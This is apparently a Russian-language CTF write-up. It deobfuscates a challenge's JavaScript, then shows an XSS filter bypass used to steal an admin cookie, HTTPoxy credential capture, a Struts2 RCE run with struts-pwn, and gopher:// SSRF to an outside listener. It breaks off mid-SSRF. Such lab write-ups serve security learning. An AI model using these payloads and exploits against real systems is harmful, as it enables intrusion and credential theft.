_0x375e6a='\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';_0x4bc567['\x61\x74\x6f\x62']||(_0x4bc567['\x61\x74\x6f\x62']=function(_0xff4850){var _0x1068ad=String(_0xff4850)['\x72\x65\x70\x6c\x61\x63\x65'](/=+$/,'');for(var _0x21c1ab=0x0,_0x50b3fc,_0x549ed8,_0x19d79f=0x0,_0x393bcc='';_0x549ed8=_0x1068ad['\x63\x68\x61\x72\x41\x74'](_0x19d79f++);~_0x549ed8&&(_0x50b3fc=_0x21c1ab%0x4?_0x50b3fc*0x40+_0x549ed8:_0x549ed8,_0x21c1ab++%0x4)?_0x393bcc+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0xff&_0x50b3fc>>(-0x2*_0x21c1ab&0x6)):0x0){_0x549ed8=_0x375e6a['\x69\x6e\x64\x65\x78\x4f\x66'](_0x549ed8);}return _0x393bcc;});}());var _0x47044a=function(_0x4b0b4e,_0x35bc6d){var _0x3b3144=[],_0x55d70b=0x0,_0x55bfd7,_0x344bdf='',_0x12e65f='';_0x4b0b4e=atob(_0x4b0b4e);for(var _0x2682ec=0x0,_0x4f28bb=_0x4b0b4e['\x6c\x65\x6e\x67\x74\x68'];_0x2682ec<_0x4f28bb;_0x2682ec++){_0x12e65f+='\x25'+('\x30\x30'+_0x4b0b4e['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x2682ec)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0x10))['\x73\x6c\x69\x63\x65'](-0x2);}_0x4b0b4e=decodeURIComponent(_0x12e65f);for(var _0x7b2fc8=0x0;_0x7b2fc8<0x100;_0x7b2fc8++){_0x3b3144[_0x7b2fc8]=_0x7b2fc8;}for(_0x7b2fc8=0x0;_0x7b2fc8<0x100;_0x7b2fc8++){_0x55d70b=(_0x55d70b+_0x3b3144[_0x7b2fc8]+_0x35bc6d['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x7b2fc8%_0x35bc6d['\x6c\x65\x6e\x67\x74\x68']))%0x100;_0x55bfd7=_0x3b3144[_0x7b2fc8];_0x3b3144[_0x7b2fc8]=_0x3b3144[_0x55d70b];_0x3b3144[_0x55d70b]=_0x55bfd7;}_0x7b2fc8=0x0;_0x55d70b=0x0;for(var _0x35fa82=0x0;_0x35fa82<_0x4b0b4e['\x6c\x65\x6e\x67\x74\x68'];_0x35fa82++){_0x7b2fc8=(_0x7b2fc8+0x1)%0x100;_0x55d70b=(_0x55d70b+_0x3b3144[_0x7b2fc8])%0x100;_0x55bfd7=_0x3b3144[_0x7b2fc8];_0x3b3144[_0x7b2fc8]=_0x3b3144[_0x55d70b];_0x3b3144[_0x55d70b]=_0x55bfd7;_0x344bdf+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](_0x4b0b4e['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x35fa82)^_0x3b3144[(_0x3b3144[_0x7b2fc8]+_0x3b3144[_0x55d70b])%0x100]);}return _0x344bdf;};_0xbe5e['\x72\x63\x34']=_0x47044a;_0xbe5e['\x64\x61\x74\x61']={};_0xbe5e['\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']=!![];}_0x4b5510+=_0x4bbc29;if(_0xbe5e['\x64\x61\x74\x61'][_0x4b5510]===undefined){if(_0xbe5e['\x6f\x6e\x63\x65']===undefined){var _0x5b212f=function(_0x38afe4){this['\x72\x63\x34\x42\x79\x74\x65\x73']=_0x38afe4;this['\x73\x74\x61\x74\x65\x73']=[0x1,0x0,0x0];this['\x6e\x65\x77\x53\x74\x61\x74\x65']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';};this['\x66\x69\x72\x73\x74\x53\x74\x61\x74\x65']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a';this['\x73\x65\x63\x6f\x6e\x64\x53\x74\x61\x74\x65']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x5b212f['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x63\x68\x65\x63\x6b\x53\x74\x61\x74\x65']=function(){var _0x2b7ee9=new RegExp(this['\x66\x69\x72\x73\x74\x53\x74\x61\x74\x65']+this['\x73\x65\x63\x6f\x6e\x64\x53\x74\x61\x74\x65']);return this['\x72\x75\x6e\x53\x74\x61\x74\x65'](_0x2b7ee9['\x74\x65\x73\x74'](this['\x6e\x65\x77\x53\x74\x61\x74\x65']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x73\x74\x61\x74\x65\x73'][0x1]:--this['\x73\x74\x61\x74\x65\x73'][0x0]);};_0x5b212f['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x72\x75\x6e\x53\x74\x61\x74\x65']=function(_0x4f75bc){if(!Boolean(~_0x4f75bc)){return _0x4f75bc;}return this['\x67\x65\x74\x53\x74\x61\x74\x65'](this['\x72\x63\x34\x42\x79\x74\x65\x73']);};_0x5b212f['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x67\x65\x74\x53\x74\x61\x74\x65']=function(_0xe0f6cf){for(var _0x8ed73a=0x0,_0x405f55=this['\x73\x74\x61\x74\x65\x73']['\x6c\x65\x6e\x67\x74\x68'];_0x8ed73a<_0x405f55;_0x8ed73a++){this['\x73\x74\x61\x74\x65\x73']['\x70\x75\x73\x68'](Math['\x72\x6f\x75\x6e\x64'](Math['\x72\x61\x6e\x64\x6f\x6d']()));_0x405f55=this['\x73\x74\x61\x74\x65\x73']['\x6c\x65\x6e\x67\x74\x68'];}return _0xe0f6cf(this['\x73\x74\x61\x74\x65\x73'][0x0]);};new _0x5b212f(_0xbe5e)['\x63\x68\x65\x63\x6b\x53\x74\x61\x74\x65']();_0xbe5e['\x6f\x6e\x63\x65']=!![];}_0x84dca=_0xbe5e['\x72\x63\x34'](_0x84dca,_0x4bbc29);_0xbe5e['\x64\x61\x74\x61'][_0x4b5510]=_0x84dca;}else{_0x84dca=_0xbe5e['\x64\x61\x74\x61'][_0x4b5510];}return _0x84dca;};var _0x915273=function(){var _0x4b5510=!![];return function(_0x4bbc29,_0x84dca){var _0x22756c=_0x4b5510?function(){if(_0x84dca){var _0x2c370f=_0x84dca['\x61\x70\x70\x6c\x79'](_0x4bbc29,arguments);_0x84dca=null;return _0x2c370f;}}:function(){};_0x4b5510=![];return _0x22756c;};}();var _0x56eb7d=_0x915273(this,function(){var _0x4b5510=function(){return'\x64\x65\x76';},_0x4bbc29=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x35ee6e=function(){var _0x2007c7=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x2007c7['\x74\x65\x73\x74'](_0x4b5510['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4bc567=function(){var _0x375e6a=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x375e6a['\x74\x65\x73\x74'](_0x4bbc29['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0xff4850=function(_0x1068ad){var _0x21c1ab=~-0x1>>0x1+0xff%0x0;if(_0x1068ad['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x21c1ab)){_0x50b3fc(_0x1068ad);}};var _0x50b3fc=function(_0x549ed8){var _0x19d79f=~-0x4>>0x1+0xff%0x0;if(_0x549ed8['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x19d79f){_0xff4850(_0x549ed8);}};if(!_0x35ee6e()){if(!_0x4bc567()){_0xff4850('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0xff4850('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0xff4850('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x56eb7d();var _0x4c8593=function(){var _0x4dbb77=!![];return function(_0x1f18c2,_0x21521f){var _0x3cf270=_0x4dbb77?function(){if(_0x21521f){var _0x31f375=_0x21521f[_0xbe5e('0x0', '\x34\x66\x64\x73')](_0x1f18c2,arguments);_0x21521f=null;return _0x31f375;}}:function(){};_0x4dbb77=![];return _0x3cf270;};}();var _0xbef4ed=_0x4c8593(this,function(){var _0xe2326f={'\x42\x6a\x4e':function _0x3342f0(_0x3d0cd6,_0x25ba05){return _0x3d0cd6(_0x25ba05);},'\x49\x69\x43':function _0x21641a(_0x8bdf4b,_0x204f5e){return _0x8bdf4b+_0x204f5e;},'\x4b\x53\x6e':function _0x1a0d12(_0x48b8de){return _0x48b8de();}};var _0x8346c9=_0xe2326f[_0xbe5e('0x1', '\x72\x73\x5a\x77')](Function,_0xe2326f[_0xbe5e('0x2', '\x26\x5e\x44\x54')](_0xbe5e('0x3', '\x73\x26\x7a\x37')+_0xbe5e('0x4', '\x72\x73\x5a\x77'),'\x29\x3b'));var _0x59568d=function(){};var _0x38faa4=_0xe2326f[_0xbe5e('0x5', '\x4a\x5d\x69\x23')](_0x8346c9);if(!_0x38faa4[_0xbe5e('0x6', '\x59\x33\x6f\x44')]){_0x38faa4['\x63\x6f\x6e\x73\x6f\x6c\x65']=function(_0x58509e){var _0x398fd2=_0xbe5e('0x7', '\x26\x75\x41\x28')[_0xbe5e('0x8', '\x42\x77\x50\x56')]('\x7c'),_0x3aed27=0x0;while(!![]){switch(_0x398fd2[_0x3aed27++]){case'\x30':_0x8f2800[_0xbe5e('0x9', '\x72\x73\x5a\x77')]=_0x58509e;continue;case'\x31':_0x8f2800[_0xbe5e('0xa', '\x6f\x56\x26\x51')]=_0x58509e;continue;case'\x32':_0x8f2800[_0xbe5e('0xb', '\x24\x7a\x32\x6f')]=_0x58509e;continue;case'\x33':_0x8f2800[_0xbe5e('0xc', '\x4c\x23\x70\x69')]=_0x58509e;continue;case'\x34':return _0x8f2800;continue;case'\x35':_0x8f2800[_0xbe5e('0xd', '\x62\x62\x70\x73')]=_0x58509e;continue;case'\x36':var _0x8f2800={};continue;case'\x37':_0x8f2800[_0xbe5e('0xe', '\x4a\x25\x61\x57')]=_0x58509e;continue;case'\x38':_0x8f2800['\x6c\x6f\x67']=_0x58509e;continue;}break;}}(_0x59568d);}else{var _0x462db3=_0xbe5e('0xf', '\x6f\x7a\x41\x74')[_0xbe5e('0x10', '\x38\x52\x6a\x33')]('\x7c'),_0xc88a8c=0x0;while(!![]){switch(_0x462db3[_0xc88a8c++]){case'\x30':_0x38faa4[_0xbe5e('0x11', '\x62\x26\x31\x26')][_0xbe5e('0x12', '\x64\x63\x53\x4b')]=_0x59568d;continue;case'\x31':_0x38faa4[_0xbe5e('0x13', '\x24\x26\x4f\x53')]['\x6c\x6f\x67']=_0x59568d;continue;case'\x32':_0x38faa4[_0xbe5e('0x14', '\x73\x50\x69\x79')][_0xbe5e('0x15', '\x24\x7a\x32\x6f')]=_0x59568d;continue;case'\x33':_0x38faa4[_0xbe5e('0x16', '\x6f\x56\x26\x51')][_0xbe5e('0x17', '\x62\x26\x31\x26')]=_0x59568d;continue;case'\x34':_0x38faa4['\x63\x6f\x6e\x73\x6f\x6c\x65']['\x65\x72\x72\x6f\x72']=_0x59568d;continue;case'\x35':_0x38faa4[_0xbe5e('0x18', '\x4c\x23\x70\x69')][_0xbe5e('0x19', '\x73\x50\x69\x79')]=_0x59568d;continue;case'\x36':_0x38faa4['\x63\x6f\x6e\x73\x6f\x6c\x65'][_0xbe5e('0x1a', '\x59\x33\x6f\x44')]=_0x59568d;continue;}break;}}});_0xbef4ed();var _0xc03e=[_0xbe5e('0x1b', '\x40\x77\x66\x48'),_0xbe5e('0x1c', '\x5e\x34\x7a\x4c'),_0xbe5e('0x1d', '\x6f\x56\x26\x51'),_0xbe5e('0x1e', '\x4c\x21\x38\x4c'),'',_0xbe5e('0x1f', '\x59\x33\x6f\x44'),_0xbe5e('0x20', '\x6a\x5a\x41\x39'),_0xbe5e('0x21', '\x26\x57\x50\x47'),'\x30','\x23',_0xbe5e('0x22', '\x26\x57\x50\x47'),_0xbe5e('0x23', '\x4f\x63\x64\x71'),_0xbe5e('0x24', '\x26\x57\x50\x47'),'\x73\x75\x62\x73\x74\x72','\x2f',_0xbe5e('0x25', '\x45\x6d\x72\x51'),_0xbe5e('0x26', '\x26\x5e\x44\x54'),_0xbe5e('0x27', '\x52\x77\x6e\x49'),'\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74',_0xbe5e('0x28', '\x5e\x34\x7a\x4c'),_0xbe5e('0x29', '\x52\x77\x6e\x49'),_0xbe5e('0x2a', '\x76\x42\x50\x31'),_0xbe5e('0x2b', '\x62\x62\x70\x73'),_0xbe5e('0x2c', '\x76\x73\x30\x23'),_0xbe5e('0x2d', '\x4a\x25\x61\x57'),_0xbe5e('0x2e', '\x4f\x63\x64\x71'),_0xbe5e('0x2f', '\x6a\x5a\x41\x39'),'\x79\x65\x73',_0xbe5e('0x30', '\x73\x26\x7a\x37'),'\x6e\x6f',_0xbe5e('0x31', '\x42\x6e\x51\x53'),_0xbe5e('0x32', '\x26\x5e\x44\x54'),_0xbe5e('0x33', '\x62\x62\x70\x73'),_0xbe5e('0x34', '\x40\x77\x66\x48'),_0xbe5e('0x35', '\x4c\x23\x70\x69'),'\x50\x4f\x53\x54',_0xbe5e('0x36', '\x26\x56\x79\x48'),'\x6f\x70\x65\x6e',_0xbe5e('0x37', '\x42\x77\x50\x56'),_0xbe5e('0x38', '\x6f\x7a\x41\x74'),_0xbe5e('0x39', '\x34\x66\x64\x73'),_0xbe5e('0x3a', '\x50\x4c\x45\x79'),_0xbe5e('0x3b', '\x50\x4c\x45\x79')];if(!location[_0xc03e[0x0]]){location[_0xc03e[0x1]]=_0xc03e[0x2];location[_0xc03e[0x3]]();};function Filter(_0x266c83){return _0x266c83[_0xc03e[0x5]](/[^-0-9a-z:\/.=?&]/gim,_0xc03e[0x4]);}function NewPage(){var _0x32cd89={'\x6d\x6e\x58':function _0x54cac9(_0x371a0d,_0x117d33){return _0x371a0d*_0x117d33;},'\x41\x6d\x70':function _0x10af14(_0x422620,_0x160188){return _0x422620+_0x160188;},'\x5a\x41\x50':function _0x4a292c(_0x21bdbb,_0x460983){return _0x21bdbb-_0x460983;},'\x44\x62\x49':function _0x5c8c29(_0x39e321,_0x365992){return _0x39e321+_0x365992;}};rand=Math[_0xc03e[0x7]](_0x32cd89[_0xbe5e('0x3c', '\x64\x32\x69\x63')](Math[_0xc03e[0x6]](),_0x32cd89[_0xbe5e('0x3d', '\x26\x5e\x44\x54')](_0x32cd89[_0xbe5e('0x3e', '\x5e\x59\x5e\x79')](0x63,0xa),0x1)))+0xa;rand=_0x32cd89['\x44\x62\x49'](_0xc03e[0x8],rand);location[_0xc03e[0x1]]=_0x32cd89[_0xbe5e('0x3f', '\x30\x4e\x5b\x73')](_0x32cd89[_0xbe5e('0x40', '\x34\x66\x64\x73')](_0xc03e[0x9],rand),_0xc03e[0xa]);location[_0xc03e[0x3]]();}function Checkurl(_0x265b12){var _0x507390={'\x52\x6a\x59':function _0x14519a(_0x4dd451,_0x237e63){return _0x4dd451!=_0x237e63;},'\x64\x6f\x48':function _0x16c0a0(_0x55192c,_0x532c5a){return _0x55192c!=_0x532c5a;},'\x4e\x53\x72':function _0x31c18a(_0x1f223d,_0x35f89c){return _0x1f223d!=_0x35f89c;}};var _0x247202=_0xbe5e('0x41', '\x5e\x77\x54\x43')[_0xbe5e('0x42', '\x53\x34\x34\x71')]('\x7c'),_0x41e6f8=0x0;while(!![]){switch(_0x247202[_0x41e6f8++]){case'\x30':if(_0x507390[_0xbe5e('0x43', '\x64\x63\x53\x4b')](_0x265b12[_0xc03e[0xc]](_0xc03e[0xb]),-0x1)){return![];}continue;case'\x31':;continue;case'\x32':;continue;case'\x33':if(_0x507390[_0xbe5e('0x44', '\x64\x50\x6e\x54')](_0x265b12[_0xc03e[0xd]](-0x4,0x4),_0xc03e[0xa])){return![];}continue;case'\x34':_0x265b12=_0x265b12[_0xc03e[0x5]](_0xc03e[0x9],_0xc03e[0x4]);continue;case'\x35':if(_0x507390[_0xbe5e('0x45', '\x73\x50\x69\x79')](_0x265b12[_0xc03e[0xc]](_0xc03e[0xe]),-0x1)){if(_0x507390[_0xbe5e('0x46', '\x4a\x5d\x69\x23')](_0x265b12[_0xc03e[0xc]](_0xc03e[0xf]),-0x1)){if(_0x507390['\x4e\x53\x72'](_0x265b12[_0xc03e[0xc]](_0xc03e[0x10]),-0x1)){return!![];}}}else{return!![];}continue;}break;}}function prepareFrame(){var _0x2b3501={'\x4f\x7a\x4d':function _0x20b853(_0x3e2412,_0xda5eaa){return _0x3e2412(_0xda5eaa);}};var _0x586767=_0xbe5e('0x47', '\x62\x62\x70\x73')[_0xbe5e('0x48', '\x76\x42\x50\x31')]('\x7c'),_0x45335e=0x0;while(!![]){switch(_0x586767[_0x45335e++]){case'\x30':if(_0x2b3501[_0xbe5e('0x49', '\x62\x26\x31\x26')](Checkurl,_0x1079a0)){var _0x4167de=_0x2b3501[_0xbe5e('0x4a', '\x38\x52\x6a\x33')](Filter,_0x1079a0);}continue;case'\x31':document[_0xc03e[0x16]][_0xc03e[0x15]](_0xc87369);continue;case'\x32':;continue;case'\x33':_0xc87369[_0xc03e[0x14]](_0xc03e[0x13],_0x4167de);continue;case'\x34':var _0x1079a0=location[_0xc03e[0x0]][_0xc03e[0x5]](_0xc03e[0x9],_0xc03e[0x4]);continue;case'\x35':var _0xc87369=document[_0xc03e[0x12]](_0xc03e[0x11]);continue;}break;}}setInterval(function(){var _0x297ead={'\x43\x4b\x48':function _0x1c0c95(_0x2749dc){return _0x2749dc();}};_0x297ead[_0xbe5e('0x4b', '\x6f\x6e\x73\x4f')](_0x24d80a);},0xfa0);function Report(){var _0x5bcf18={'\x47\x6f\x4c':function _0x759df6(_0xd1bd1a,_0x41a38b){return _0xd1bd1a(_0x41a38b);},'\x53\x77\x52':function _0x1811d5(_0x346cb2,_0x136af4){return _0x346cb2==_0x136af4;},'\x4d\x63\x4c':function _0x58ed30(_0x12095f,_0x38b902){return _0x12095f==_0x38b902;},'\x4b\x61\x74':function _0x6a891b(_0x41cfd7,_0x56df81){return _0x41cfd7+_0x56df81;}};if(_0x5bcf18[_0xbe5e('0x4c', '\x42\x47\x65\x29')](confirm,_0xc03e[0x17])){if(_0x5bcf18[_0xbe5e('0x4d', '\x73\x39\x56\x5b')](confirm,_0xc03e[0x18])){if(_0x5bcf18[_0xbe5e('0x4e', '\x4f\x63\x64\x71')](confirm,_0xc03e[0x19])){if(_0x5bcf18[_0xbe5e('0x4f', '\x26\x56\x79\x48')](_0x5bcf18[_0xbe5e('0x50', '\x5e\x34\x7a\x4c')](prompt,_0xc03e[0x1a]),_0xc03e[0x1b])){if(_0x5bcf18[_0xbe5e('0x51', '\x73\x26\x7a\x37')](_0x5bcf18[_0xbe5e('0x52', '\x73\x26\x7a\x37')](prompt,_0xc03e[0x1c]),_0xc03e[0x1d])){var _0x46c548=_0xbe5e('0x53', '\x24\x26\x4f\x53')['\x73\x70\x6c\x69\x74']('\x7c'),_0x14788e=0x0;while(!![]){switch(_0x46c548[_0x14788e++]){case'\x30':sites=[_0xc03e[0x1e],_0xc03e[0x1f],_0xc03e[0x20]];continue;case'\x31':var _0x37cfb9=sites[Math[_0xc03e[0x7]](Math[_0xc03e[0x6]]()*sites[_0xc03e[0x21]])];continue;case'\x32':_0x46908d[_0xc03e[0x28]](_0xc03e[0x26],_0xc03e[0x27]);continue;case'\x33':_0x46908d[_0xc03e[0x29]](_0x50046b);continue;case'\x34':var _0x46908d=new XMLHttpRequest();continue;case'\x35':_0x5bcf18[_0xbe5e('0x54', '\x26\x75\x41\x28')](alert,_0xc03e[0x2a]);continue;case'\x36':_0x46908d[_0xc03e[0x25]](_0xc03e[0x23],_0xc03e[0x24],!![]);continue;case'\x37':var _0x50046b=_0xc03e[0x22]+_0x5bcf18[_0xbe5e('0x55', '\x4a\x5d\x69\x23')](encodeURIComponent,_0x5bcf18[_0xbe5e('0x56', '\x45\x6d\x72\x51')](_0x37cfb9,location[_0xc03e[0x0]]));continue;}break;}}}}}}}var _0x24d80a=function(){var _0xd8b766={'\x61\x56\x48':function _0x19abd1(_0x187442,_0x3e11e1){return _0x187442!==_0x3e11e1;},'\x41\x51\x75':function _0x404805(_0x67bb0e,_0x2918bf){return _0x67bb0e+_0x2918bf;},'\x54\x5a\x76':function _0x3d03c5(_0x591bc9,_0x419c4a){return _0x591bc9/_0x419c4a;},'\x4b\x4c\x7a':function _0x7f984a(_0x36d5bb,_0x29c908){return _0x36d5bb===_0x29c908;},'\x67\x4d\x7a':function _0x163a78(_0xde4d58,_0x1458e2){return _0xde4d58%_0x1458e2;},'\x47\x48\x50':function _0x539a9f(_0x2a07af,_0x125417){return _0x2a07af(_0x125417);},'\x73\x52\x71':function _0x1fe630(_0x19de48,_0x4776e7){return _0x19de48(_0x4776e7);}};function _0x2a2ab9(_0x3bbff5){if(_0xd8b766[_0xbe5e('0x57', '\x6f\x56\x26\x51')](_0xd8b766[_0xbe5e('0x58', '\x64\x32\x69\x63')]('',_0xd8b766[_0xbe5e('0x59', '\x24\x7a\x32\x6f')](_0x3bbff5,_0x3bbff5))[_0xbe5e('0x5a', '\x26\x57\x50\x47')],0x1)||_0xd8b766[_0xbe5e('0x5b', '\x42\x6e\x51\x53')](_0xd8b766[_0xbe5e('0x5c', '\x65\x31\x44\x4d')](_0x3bbff5,0x14),0x0)){(function(){}['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'](_0xbe5e('0x5d', '\x4a\x5d\x69\x23'))());}else{(function(){}[_0xbe5e('0x5e', '\x30\x4e\x5b\x73')](_0xbe5e('0x5f', '\x34\x66\x64\x73'))());}_0xd8b766[_0xbe5e('0x60', '\x4f\x29\x32\x71')](_0x2a2ab9,++_0x3bbff5);}try{_0xd8b766[_0xbe5e('0x61', '\x64\x63\x53\x4b')](_0x2a2ab9,0x0);}catch(_0x32a034){}};_0x24d80a();
</script>
{% endhighlight %}
Ужасный ужас. Берем этот файл и скармливаем любому js деобфускатору, он хотя бы выровнит отступы, если он не справляется с хекс-литералами вместо имен переменных/функций и т.д. то пишем маленький скрипт который сделает это сам. В как-то читабельном коде замечаем что один из массивов стал массивом из base64 строк, а также появилась rc4 функция, которая берет индекс строки и ключ для дешифровки, опять пишем небольшой дешифратор и уже получаем нормальные строки вместо зашифрованных base64(кстати ключи подходят со сдвигом 58). Дальее надо убрать вообще функцию по rc4, так как в ней есть infinite loop-ы которые убивают страничку а браузере, после этого также комментирует следующую строку
{% highlight ruby %}
(function() {}).constructor("debugger")();
{% endhighlight %}
Тоже небольшая анти-дебаг штучка, а лучше вообще весь setInterval убрать, где он вызывается. уже получаем читабельный и рабочий скрипт. Пишем еще один, последний, скрипт, который автоматом подставляет текст из массива. Видим что появились несколько нормальный функций, самы важные для нас это Report() который делает POST запрос по адресу
{% highlight ruby %}
/admin/report_url.php?url=http://youpopcorn.com/#001.jpg
{% endhighlight %}
Адрес сайта случано выбирается из 3х возможных
{% highlight ruby %}
sites = ["http://popcornhub.com/", "http://xhrumster.com/", "http://youpopcorn.com/"];
var var_f9 = sites[Math["floor"](Math["random"]() * sites["length"])];
var var_e1 = new XMLHttpRequest();
var var_e2 = "url=" + var_d3["GoL"](encodeURIComponent, var_d3["Kat"](var_f9, location["hash"]));
var_e1["open"]("POST", "/admin/report_url.php", !![]);
var_e1["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded");
var_e1["send"](var_e2);
var_d3["GoL"](alert, "Thx! Administrator will check url!");
{% endhighlight %}
А также функция CheckUrl(), в которой описано как далее администратор проверяет отправленную ему ссылку.
{% highlight ruby %}
if (var_a5["RjY"](var_a4["indexOf"]("javascript"), -1)) {
    return ![];
}
if (var_a5["doH"](var_a4["substr"](-4, 4), ".jpg")) {
    return ![];
}
var_a4 = var_a4["replace"]("#", "");
if (var_a5["doH"](var_a4["indexOf"]("/"), -1)) {
    if (var_a5["NSr"](var_a4["indexOf"]("://"), -1)) {
        if (var_a5.NSr(var_a4["indexOf"]("http://"), -1)) {
            return !![];
}
}
} else {
return !![];
}
{% endhighlight %}
То есть ссылка проверяется на отсутствие слова javascript, кроме этого надо, чтобы url заканчивался на .jpg, после чего знак # удаляется и проверяется существование "/", "://", "http://" в ссылке.
В чем слабости этих проверок, давайте по порядку: javascript проверяется только в lowercase-е, хотя как ключевое слово он работает в любом case-е, символ "#" никак не влияет на адрес url-а, поэтому условие чтобы адрес заканчивался на .jpg легко сфальсифицировать добавив #blabla.jpg в конец ссылки, да # удаляется, но удаляется лишь первое его вхождение в строку, а значит пишем ##blabla.jpg и все будет ок! про остальные проверки даже говорить не стоит, они нам вообще не мешают.

<br><br>После всего что мы узнали, естественное желание заставить пройти админа по ссылке, да еще и так, чтобы мы украли его cookie. Делать мы это будем при помощи javascript-uri, а точнее при помощи 
{% highlight ruby %}
jAvAscriPt:blablabla;//##some.jpg
{% endhighlight %}
Где вместо blablabla будет просто перенаправление admin на наш снифер + с куками в аргументах. Однако оказывается, что у админа видимо стоит еще какая-то проверка на слово javascript, или же эта часть отпадает в php при передаче ссылки, решаем данный вопрос добавлением символов переноса строки - %0d%0a ведь в адресной строке она не принесет нам никаких неудобств. В итоге делаем полный url-encode всего нашего пейлоада(чтобы точно избежать потерь при передаче) и отправляем админу. 
И вуаля получаем на сниффер:
{% highlight ruby %}
flag=c0a495e8886c26afc0d541da2d19adf0
{% endhighlight %}
<br><br>
## PWND!

## flag:<font color="red">c0a495e8886c26afc0d541da2d19adf0</font>

<br><br>CIA: Заходим на сайт, кроме лого больше ничего не видим, сканируем директории, находим там /orders/ на котором висит http basic auth. Естественно, пытаемся брутфорсить со стандартными логинами - терпим неудачу. Потыкав сайт замечаем версию веб-сервера 
{% highlight ruby %}
Apache/2.4.10 (Debian) Server at cia.rosnadzorcom.ru Port 80
{% endhighlight %}
Идем искать, что можно найти на эту версию веб-сервера, попробовав несколько из "больших" эксплоитов, угадываем с HTTProxy. Крафтим запрос вида 
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-burp.png)
Заранее подняв лисенер на порту принимаем на сервис и видим
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-creds.png)
У нас есть все что надо, идем на /orders/ , впринципе там делать особо нечего, можно еще раз дирбастнуть или же просто немного потыкав на сайт, видим вывод ошибки при  url вида /orders/orders/asd/bla
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-error.png)
То есть на сервере еще и работает struts2 и opensymphony. Вспоминаем, или же гуглим на них эксплоиты, недавно выходил RCE эксплоит на struts2. Берем его изменяем исходники, чтобы он отправлял в запросе также и хидер Authentification:
![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-exploit.png)
И запускаем экслоит
{% highlight ruby %}
python struts-pwn.py -u https://cia.rosnadzorcom.ru/orders/orders/asd/asd -c ls

[*] URL: https://cia.rosnadzorcom.ru/orders/orders/asd/asd
[*] CMD: ls
Afkr4iFDfg32d_SECRET.txt
bin
boot
core
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

[%] Done.
{% endhighlight %}
Осталось прочитать файл Afkr4iFDfg32d_SECRET.txt
{% highlight ruby %}
python struts-pwn.py -u https://cia.rosnadzorcom.ru/orders/orders/asd/asd -c "cat Afkr4iFDfg32d_SECRET.txt"

[*] URL: https://cia.rosnadzorcom.ru/orders/orders/asd/asd
[*] CMD: cat Afkr4iFDfg32d_SECRET.txt
FLAG_IS: md5('!!N3ith3r__c0nf1rm_N0r_d3n141--')
[%] Done.
{% endhighlight %}

## PWND!

## flag:<font color="red">md5('!!N3ith3r__c0nf1rm_N0r_d3n141--')</font>

<br><br>ANONYMIZER:Заходим на сайт, видим, что там работает "анонимайзер", который позволяет ходит на любым адресам. Пройдя по любому адресу смотрим на запрос который отправляется

{% highlight ruby %}
https://anonymizer.rosnadzorcom.ru/?url=http%3A%2F%2Flocalhost&page=curl&submit=+GO%21+.
{% endhighlight %}
Особенное внимание уделяем параметру page=curl(важно во время дирбаста заметить, что на сайте есть curl.php, и предпологаем что в php что-то по типу include('./'.$_GET["page"].'.php')). Сайт работает через curl_exec() скорее всего, а значит, если нет достаточной фильтрации входных данных, то можно использовать зачемательный протокол gopher:// , поднимаем сервер и пробуем, отправляес запрос вида
{% highlight ruby %}
https://anonymizer.rosnadzorcom.ru/?url=gopher://IP:PORT/_HELLO&page=curl&submit=+GO%21+
{% endhighlight %}
На сервере получаем
{% highlight ruby %}
207.154.234.51: inverse host lookup failed: Unknown host
connect to [IP] from (UNKNOWN) [207.154.234.51] 34032
HELLO
{% endhighlight %}
Поздавляю, перед нами SSRF уязвимость, проверяем нормально ли все работает с localhost
{% highlight ruby %}
https://anonymizer.rosnadzorcom.ru/?url=gopher://localhost:80/_GET%20/&page=curl&submit=+GO%21+
{% endhighlight %}
